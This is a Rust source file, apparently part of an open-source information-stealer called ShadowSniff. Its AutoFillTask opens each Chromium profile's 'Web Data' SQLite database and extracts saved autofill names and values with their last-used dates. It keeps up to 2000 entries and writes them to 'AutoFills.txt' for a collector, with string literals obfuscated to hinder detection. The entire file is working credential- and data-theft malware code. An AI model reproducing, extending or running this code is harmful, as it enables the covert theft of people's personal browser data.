/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{AutoFill, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const AUTOFILL_NAME: usize = 0;
const AUTOFILL_VALUE: usize = 1;
const AUTOFILL_DATE_LAST_USED: usize = 4;

#[derive(new)]
pub(super) struct AutoFillTask {
    browser: Arc<BrowserData>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
    parent_name!("AutoFills.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut auto_fills) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("Web Data"),
            s!("Autofill"),
            extract_autofill_from_record,
        ) else {
            return;
        };

        auto_fills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
        auto_fills.truncate(2000);

        collector
            .get_browser()
            .increase_auto_fills_by(auto_fills.len());

        let _ = to_string_and_write_all(&auto_fills, "\n\n", filesystem, parent);
    }
}

fn extract_autofill_from_record<R: TableRecord>(record: &R) -> Option<AutoFill> {
    let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
    let name = record.get_value(AUTOFILL_NAME)?.as_string()?;
    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?;

    Some(AutoFill {
        name,
        value,
        last_used,
    })
}
